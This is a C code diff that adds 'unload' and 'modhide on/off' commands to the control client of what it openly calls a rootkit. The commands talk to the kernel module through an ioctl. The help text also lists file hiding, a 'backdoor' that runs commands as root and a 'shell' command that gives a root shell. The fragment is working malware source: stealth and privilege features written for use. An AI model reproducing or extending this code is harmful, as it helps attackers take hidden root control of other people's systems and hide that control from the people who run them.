@@ -34,6 +34,19 @@ parse_input(int argc, char **argv)
     if (ARGVCMP(1, "ping"))
         return (cmd_t){ handle_ping, NULL };
 
+    if (ARGVCMP(1, "unload"))
+        return (cmd_t){ handle_modhide, (void *)0 };
+
+    if (ARGVCMP(1, "modhide")) {
+        ASSERT_ARGC(2, "modhide <on | off>");
+
+        if (ARGVCMP(2, "on"))
+            return (cmd_t){ handle_modhide, (void *)1 };
+
+        if (ARGVCMP(2, "off"))
+            return (cmd_t){ handle_modhide, (void *)-1 };
+    }
+
     if (ARGVCMP(1, "filehide")) {
         ASSERT_ARGC(2, "filehide <toggle | on | off>");
 
@@ -95,6 +108,12 @@ int
 handle_ping(void *arg)
 {
     return issue_ioctl(G7_PING, "PING");
+}
+
+int
+handle_modhide(void *arg)
+{
+    return issue_ioctl(G7_MODHIDE, (const char *)arg);
 }
 
 int
@@ -164,6 +183,8 @@ help()
     printf("These are the available commands:\n");
     printf("%-32s %s\n", "help", "this message");
     printf("%-32s %s\n", "ping", "send an echo request to the rootkit");
+    printf("%-32s %s\n", "unload", "gracefully unload the rootkit module");
+    printf("%-32s %s\n", "modhide <on | off>", "{,un}hide rootkit module");
     printf("%-32s %s\n", "filehide <toggle | on | off>", "{,un}hide files");
     printf("%-32s %s\n", "backdoor <execve_command>", "exec a command as root");
     printf("%-32s %s\n", "shell", "obtain a shell as root");
